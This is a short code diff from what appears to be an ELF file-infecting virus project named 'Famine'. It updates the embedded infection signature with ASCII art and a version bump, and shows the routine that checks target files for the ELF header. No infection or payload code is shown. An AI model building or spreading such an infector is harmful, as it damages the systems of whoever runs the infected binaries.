@@ -19,7 +19,9 @@
 void famine(char *name, char *path)
 {
 	struct stat statbuf;
-	static const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0Famine 1.3 by mbrement and mgama";
+
+
+	static const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.4 by mbrement and mgama";
 	static const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
 	static const size_t elf_magic_size = sizeof(elf_magic);
 
@@ -46,7 +48,7 @@ void famine(char *name, char *path)
 
 	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
 	{
-		// printf("not an elf file\n");
+		// printf("not an elf file");
 		close(fd);
 		return ;
 	}
